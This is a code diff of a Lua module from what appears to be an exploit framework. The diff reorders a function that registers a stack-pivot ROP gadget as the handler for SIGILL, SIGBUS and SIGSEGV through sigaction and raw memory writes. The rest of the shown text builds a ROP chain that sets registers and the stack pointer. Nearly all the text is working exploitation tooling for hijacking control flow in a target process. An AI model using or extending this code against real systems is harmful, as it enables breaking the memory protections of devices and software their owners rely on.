@@ -1,6 +1,31 @@
 
 signal = {}
 
+function signal.init()
+
+    local pivot_handler = gadgets.stack_pivot[1]
+
+    local SIGILL = 4
+    local SIGBUS = 10
+    local SIGSEGV = 11
+    
+    local signals = {SIGILL, SIGBUS, SIGSEGV}
+    
+    local SA_SIGINFO = 0x4
+    local sigaction_struct = memory.alloc(0x28)
+    
+    memory.write_qword(sigaction_struct, pivot_handler.gadget_addr) -- sigaction.sa_handler
+    memory.write_qword(sigaction_struct+0x20, SA_SIGINFO) -- sigaction.sa_flags
+
+    for i,signal in ipairs(signals) do
+        if syscall.sigaction(signal, sigaction_struct, 0):tonumber() < 0 then
+            error("sigaction() error: " .. get_error_string())
+        end
+    end
+
+    signal.setup_pivot_handler(pivot_handler)
+end
+
 function signal.setup_pivot_handler(pivot_handler)
 
     local mcontext_offset = 0x40
@@ -16,7 +41,6 @@ function signal.setup_pivot_handler(pivot_handler)
 
     local chain = ropchain({
         stack_base = pivot_handler.pivot_addr,
-        start_from_base = true,
     })
 
     --
@@ -72,31 +96,6 @@ function signal.setup_pivot_handler(pivot_handler)
     chain:push_set_rdi(0)
     chain:push_set_rax(0)
     chain:push_set_rsp(0) -- will be changed
-end
-
-function signal.init()
-
-    local pivot_handler = gadgets.stack_pivot[1]
-
-    local SIGILL = 4
-    local SIGBUS = 10
-    local SIGSEGV = 11
-    
-    local signals = {SIGILL, SIGBUS, SIGSEGV}
-    
-    local SA_SIGINFO = 0x4
-    local sigaction_struct = memory.alloc(0x28)
-    
-    memory.write_qword(sigaction_struct, pivot_handler.gadget_addr) -- sigaction.sa_handler
-    memory.write_qword(sigaction_struct+0x20, SA_SIGINFO) -- sigaction.sa_flags
-
-    for i,signal in ipairs(signals) do
-        if syscall.sigaction(signal, sigaction_struct, 0):tonumber() < 0 then
-            error("sigaction() error: " .. get_error_string())
-        end
-    end
-
-    signal.setup_pivot_handler(pivot_handler)
 end
 
 function signal.set_sink_fd(fd)
